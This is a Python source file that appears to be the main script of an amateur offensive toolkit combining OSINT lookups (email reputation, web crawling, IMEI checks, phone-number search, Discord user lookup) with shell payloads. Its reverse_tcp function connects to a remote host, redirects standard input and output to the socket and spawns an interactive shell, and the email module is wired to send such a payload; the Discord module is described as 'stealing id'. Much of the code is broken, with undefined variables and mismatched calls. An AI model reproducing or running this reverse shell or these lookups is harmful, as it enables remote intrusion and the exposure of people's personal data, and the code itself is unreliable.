#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pyfiglet import Figlet
from colorama import Fore, init
import threading
import requests
import time
import sys
import os
import base64
import time as t
import argparse
import sys
import platform
import getpass
import subprocess
import socket
from netaddr import IPNetwork, IPAddress
import argparse
import socket
import threading
import time
import sys
import random
import urllib.request
from queue import Queue
from modules import intmail
from modules.intmail import EmailRep
from modules import intcrawler
from modules import intninja
from modules import phonesearcher
from modules import intdc

def bind_tcp(lhosts, lports):
	try:
		s.bind(lhosts, lports)
		conn, addr = s.accept()
		print("tcp addr is accepted ")
	except:
		print("tcp addr is not value or not accepted")
def reverse_tcp(rhosts, rports, addr):
    try:        
        # Connect to the remote host and port
        s.connect((rhosts, rports))
        
        # Redirect standard input/output/error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call([addr, '-i'])
    except Exception as e:
        print(f"Error: {e}")
        s.close()
def check_path():
	path = "/data/data/com.termux/files/home/"
	if os.path.exists(path):
		pass
	else:
		path = "/usr/opt/"
		
def intmail(mail):
	EmailRep.query(self, mail)
def mail_options(mail, required=None):
	print(f"""
	TARGET          REQUİRED       DESCRİPTİON
   ========	   ==========   =============
	 {mail}              YES         		Target Mail 
	""" if required else f"""
	TARGET     REQUİRED      DESCRİPTİON
   ========  ==========   ============
	{mail}			No				 Target Mail
	""")
def run_intmail(mail, lhost, lport, rhost, rport, payload, reverse=None, bind=None, required=None):
	EmailRep.query(self, mail)
	global tcp
	if payload.endswith('reverse_tcp'):
		reverse_tcp(rhost, rport, payload)
		tcp = 'reverse_tcp' 
	else:
		bind_tcp(lhost, lport, payload)
		tcp = 'bind_tcp'
	if tcp == 'reverse_tcp':
		print(f"""
Module   Hosts       Payload    Required  case
------------   -----------      --------------   --------------- ----------	     
intmail  Rhost:{rhost} {payload + 'reverse'} {'yes' if required else 'no'} sended
		      Rport: {rport}
		      lhost: {lhost}
		      lport: {lport}
		""")
	else:		
		print(f"""
Module   Hosts       Payload    Required  case
------------   -----------      --------------   --------------- ----------	     
intmail  Rhost:{rhost} {payload + ' bind'} {'yes' if required else 'no'} sended
		      Rport: {rport}
		      lhost: {lhost}
		      lport: {lport}
		""")
	exit()
def crawl(url, case=None):
	st = intcrawler.crawl(url)
	if st.stdout:
		case = "good"
		intcrawler.crawl(url)
		exit()
	else:
		case="bad"
		exit()
def crawl_run(url, required=None):
	print(f"""
     Module       Hosts  Required  Case
    ---------------    ----------- --------------- -----------
    intcrawler    {url}     {'yes' if required == 'yes' else 'No'} good
	""")
	crawl(url)
def crawl_option(intcrawler, required=None):
	print("""
    TARGET     REQUİRED       DESCRİPTİON
   ========  ==========   ==============
   {intcrawler} 	 Yes			   crawling sites
	""")
def imeicheck(imei):
	intninja.imeicheck(imei)
def imeicheck_option(imei):
	imei_check(imei)
	print(f"""
	Module       Hosts    İmei     Case
   --------------    ------------  -----------  ---------
   imeicheck No need  {imei}  good
	                  for host
	""")
def phonesearch(number):
	phonesearcher.PhoneSearch.search(self, number)
def phonesearch_options(number):
	print(f"""
	Module       Hosts  Number  Case
   --------------    ------------  -----------  ---------
  imeicheck No need {number}  good
	                 for host
	""")
def phonesearch_run(number, required=None):
    print(f"""
TARGET      REQUIRED    DESCRIPTION
========   =========   ============
{number}   {'no' if required is None else 'yes'}  searching phone
    """)
def discord(userid):
	intdc.search(userid)
	token = intdc.search(userid).stdout
def discord_option(userid, tok=None):
	print(f"""
	Module       Hosts    Token     İD        Case 
  ---------------    ------------  -----------   ---------   -----------
  intdiscord   No need  {tok}     {userid} good
                       For Host
	""")
def discord_run(userid, required=None):
	print(f"""
	TARGET      REQUİRED    DESCRİPTİON
   ========   =========   =============
    {userid}       {'no' if required is None else 'yes'} stealing id
	""")
	discord(userid)